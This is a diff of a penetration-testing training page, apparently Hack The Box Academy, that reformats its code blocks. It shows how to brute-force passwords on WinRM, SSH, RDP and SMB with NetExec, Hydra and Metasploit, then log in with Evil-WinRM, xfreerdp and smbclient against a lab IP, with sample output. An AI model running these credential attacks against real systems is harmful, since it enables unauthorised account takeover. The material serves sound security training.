@@ -22,8 +22,7 @@ A handy tool that we can use for our password attacks is [NetExec](https://githu
 
 We can install `NetExec` with `apt`, or clone the [GitHub repo](https://github.com/Pennyw0rth/NetExec) and follow the various [installation](https://www.netexec.wiki/getting-started/installation) methods, such as installing from source and avoiding dependency issues.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo apt-get -y install netexec
 ```
 
@@ -31,8 +30,7 @@ hiimeins@htb[/htb]$ sudo apt-get -y install netexec
 
 Running the tool with the `-h` flag will show us general usage instructions and some options available to us.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ netexec -h
 
 usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
@@ -104,8 +102,7 @@ Available Protocols:
 
 Note that we can specify a specific protocol and receive a more detailed help menu of all of the options available to us. NetExec currently supports remote authentication using NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ netexec smb -h
 
 usage: netexec smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
@@ -133,15 +130,13 @@ positional arguments:
 
 The general format for using NetExec is as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
 ```
 
 As an example, this is what attacking a WinRM endpoint might look like:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list
 
 WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
@@ -156,8 +151,7 @@ Another handy tool that we can use to communicate with the WinRM service is [Evi
 
 #### Installing Evil-WinRM
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo gem install evil-winrm
 
 Fetching little-plugger-1.1.4.gem
@@ -176,13 +170,11 @@ Happy hacking! :)
 
 #### Evil-WinRM Usage
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
 
 Evil-WinRM shell v3.3
@@ -215,8 +207,7 @@ The hashing method converts the transmitted data into another unique value. SSH 
 We can use a tool like `Hydra` to brute force SSH.
 This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -231,8 +222,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:
 
 To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ssh user@10.129.42.197
 
 The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
@@ -258,8 +248,7 @@ Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troublesh
 
 We can also use `Hydra` to perform RDP bruteforcing.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -280,13 +269,11 @@ Linux offers different clients to communicate with the desired server using the 
 
 #### xFreeRDP
 
-```
-        bash
+```bash
 xfreerdp /v:<target-IP> /u:<username> /p:<password>
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
 
 <SNIP>
@@ -310,8 +297,7 @@ SMB is also known as [Common Internet File System](https://cifs.com/) (`CIFS`). 
 
 #### Hydra - SMB
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -328,8 +314,7 @@ However, we may also get the following error describing that the server has sent
 
 #### Hydra - Error
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -345,8 +330,7 @@ This is because we most likely have an outdated version of THC-Hydra that cannot
 
 #### Metasploit Framework
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfconsole -q
 
 msf6 > use auxiliary/scanner/smb/smb_login
@@ -404,8 +388,7 @@ Now we can use `NetExec` again to view the available shares and what privileges 
 
 #### NetExec
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
 
 SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
@@ -423,8 +406,7 @@ To communicate with the server via SMB, we can use, for example, the tool [smbcl
 
 #### Smbclient
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
 
 Enter WORKGROUP\user's password: *******
